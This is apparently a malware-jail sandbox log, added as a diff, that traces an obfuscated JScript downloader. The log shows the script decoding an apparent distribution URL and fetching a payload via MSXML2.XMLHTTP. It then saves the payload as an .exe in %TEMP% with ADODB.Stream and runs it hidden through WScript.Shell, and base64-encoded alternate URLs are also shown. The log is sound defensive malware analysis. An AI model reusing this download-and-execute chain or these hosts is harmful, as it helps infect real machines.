@@ -1,0 +1,88 @@
+11 Sep 18:42:48 - mailware-jail, a malware sandbox ver. 0.15
+11 Sep 18:42:48 - ------------------------
+11 Sep 18:42:48 - Arguments: /home/maik/gitHub/TFM/fame/storage/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js
+11 Sep 18:42:48 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+11 Sep 18:42:48 - Malware files: /home/maik/gitHub/TFM/fame/storage/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js
+11 Sep 18:42:48 - Execution timeout set to: 60 seconds
+11 Sep 18:42:48 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+11 Sep 18:42:48 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+11 Sep 18:42:48 - Download from remote server: No
+11 Sep 18:42:49 - ==> Preparing Sandbox environment.
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+11 Sep 18:42:49 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+11 Sep 18:42:49 - ==> Executing malware file(s). =========================================
+11 Sep 18:42:49 -  => Executing: /home/maik/gitHub/TFM/fame/storage/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js verbosely, reporting silent catches
+11 Sep 18:42:49 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5_6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js
+11 Sep 18:42:49 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5_6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js
+11 Sep 18:42:49 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js'
+11 Sep 18:42:49 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5/6b73e1225c7e257843f60a0666908f07eea31192dc03f26868557cbd1dddffd5.js,xyz'
+11 Sep 18:42:49 - new Function(DAS, TortPankaky = new Function('ReebokGalaxyFROGvostochniy', velVITK_BOSKO_2S.pizzaTT());) => Function[14]
+11 Sep 18:42:49 - Calling Function[14]() on sandbox
+11 Sep 18:42:49 - new Function(ReebokGalaxyFROGvostochniy, cheboksar = {'U':'S',':':'.','88':'','BOLGARIN':'onseBody','77':'','101':'','FARISHMY':'X',  '11':''};??ReebokGalaxyFROGtaliluev = ReebokGalaxyFROGvostochniy;??for (var ReebokGalaxyFROG2XCOP in cheboksar){ReebokGalaxyFROGt ... (truncated)) => Function[15]
+11 Sep 18:42:49 - Returning: 'undefined'
+11 Sep 18:42:49 - new Function(FROSTICK,FROSTICK, topSecretLine = new Function('vVREBFF3','return \"TVM=\".pizzaTT();');) => Function[16]
+11 Sep 18:42:49 - Calling Function[16]() on sandbox
+11 Sep 18:42:49 - new Function(vVREBFF3, return "TVM=".pizzaTT();) => Function[17]
+11 Sep 18:42:49 - Returning: 'undefined'
+11 Sep 18:42:49 - Calling Function[17]() on sandbox
+11 Sep 18:42:49 - Returning: 'MS'
+11 Sep 18:42:49 - Calling Function[15](2.FARISHMYML77H101TTP45FROSTICK45WScript:Uh) on sandbox
+11 Sep 18:42:49 - Returning: '2.XMLHTTP45FROSTICK45WScript.Sh'
+11 Sep 18:42:49 - new Function(HORN,  var GALAXY = "chastity necessarily()";var kelso = "ADODB.Str32"; return kelso.replace("TRUMP", "D").replace("32", "eam");) => Function[18]
+11 Sep 18:42:49 - ActiveXObject(MSXML2.XMLHTTP)
+11 Sep 18:42:49 - new MSXML2.XMLHTTP[19]
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].onreadystatechange = (undefined) 'undefined'
+11 Sep 18:42:49 - ActiveXObject(WScript.Shell)
+11 Sep 18:42:49 - new WScript.Shell[20]
+11 Sep 18:42:49 - WScript.Shell[20].ExpandEnvironmentStrings(%TEMP%) => C:\Users\User\AppData\Local\Temp
+11 Sep 18:42:49 - Calling eval[1]('')
+11 Sep 18:42:49 - Calling eval[2]('')
+11 Sep 18:42:49 - new Function(YMWDsilhouette_FROG2_a5,YMWDsilhouette_FROG2HORDA5, return YMWDsilhouette_FROG2_bChosteck.pizzaTT() + YMWDsilhouette_FROG2_a5[YMWDsilhouette_FROG2HORDA5].pizzaTT();) => Function[21]
+11 Sep 18:42:49 - Calling Function[21](FROSTICKdGJkZXhwFROSTICKcmVzcy5jb20vOTRoZzRnNGc/,FROSTICKa3QtbW0uY29FROSTICKtLzk0aGc0ZzRnPw==,FROSTICKdmlzaXRteW1lZGFROSTICKlhLmNvbS85NGhnNGc0Zz8=,FROSTICKODl0ZzdnamtraGhwcm90dGl0eS5jb2FROSTICK0vYWYvOTRoZzRnNGc=,FROSTICK, 0) on sandbox
+11 Sep 18:42:49 - Returning: 'http://tbdexpress.com/94hg4g4g?'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].open(GET,http://tbdexpress.com/94hg4g4g??XDeffqNEt=XDeffqNEt,false)
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].method = (string) 'GET'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].url = (string) 'http://tbdexpress.com/94hg4g4g??XDeffqNEt=XDeffqNEt'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].async = (boolean) 'false'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].setRequestHeader(User-Agent, Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0))
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].send(undefined)
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19] Not sending data, if you want to interact with remote server, set --down
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].status = (number) '200'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].readystate = (number) '4'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].onreadystatechange.get() => (undefined) 'undefined'
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].send(undefined) finished
+11 Sep 18:42:49 - MSXML2.XMLHTTP[19].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:42:49 - Calling Function[18]() on sandbox
+11 Sep 18:42:49 - Returning: 'ADODB.Stream'
+11 Sep 18:42:49 - ActiveXObject(ADODB.Stream)
+11 Sep 18:42:49 - new ADODB_Stream[22]
+11 Sep 18:42:49 - new Function(n, enc,     fridge = Math.floor(n);     if (x < 256*256*256) {        bytes = [            max + 2,            Math.floor(x / 256 / 256),            Math.floor(remit / 256) % 256,            x % 256        ];    }    else if (x < 256*256*256*256) {   ... (truncated)) => Function[23]
+11 Sep 18:42:49 - new Function(FROSTICK,FROSTICK2, FROSTICK[FROSTICK2]();) => Function[24]
+11 Sep 18:42:49 - new Function(FROSTICK,FROSTICK2, FROSTICK.write(FROSTICK2);) => Function[25]
+11 Sep 18:42:49 - Calling Function[24](ADODB_Stream[22], open) on sandbox
+11 Sep 18:42:49 - ADODB_Stream[22].Open()
+11 Sep 18:42:49 - Returning: 'undefined'
+11 Sep 18:42:49 - ADODB_Stream[22].type = (number) '1'
+11 Sep 18:42:49 - Calling Function[25](ADODB_Stream[22], MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy c ... (truncated)) on sandbox
+11 Sep 18:42:49 - ADODB_Stream[22].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:42:49 - ADODB_Stream[22].Write(str) - 11202 bytes
+11 Sep 18:42:49 - ADODB_Stream[22].size = (number) '11202'
+11 Sep 18:42:49 - Returning: 'undefined'
+11 Sep 18:42:49 - ADODB_Stream[22].position = (number) '0'
+11 Sep 18:42:49 - ADODB_Stream[22].SaveToFile(C:\Users\User\AppData\Local\Temp/XDeffqNEt1.exe, 2)
+11 Sep 18:42:49 - ADODB_Stream[22].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:42:49 - ADODB_Stream[22].Close()
+11 Sep 18:42:49 - WScript.Shell[20].Run(C:\Users\User\AppData\Local\Temp/XDeffqNEt1.exe, 0, false)
+11 Sep 18:42:49 - ==> Cleaning up sandbox.
+11 Sep 18:42:49 - ==> Script execution finished, dumping sandbox environment to a file.
+11 Sep 18:42:49 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+11 Sep 18:42:49 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/eval1.js
+11 Sep 18:42:49 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/eval2.js
+11 Sep 18:42:49 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp_XDeffqNEt1.exe
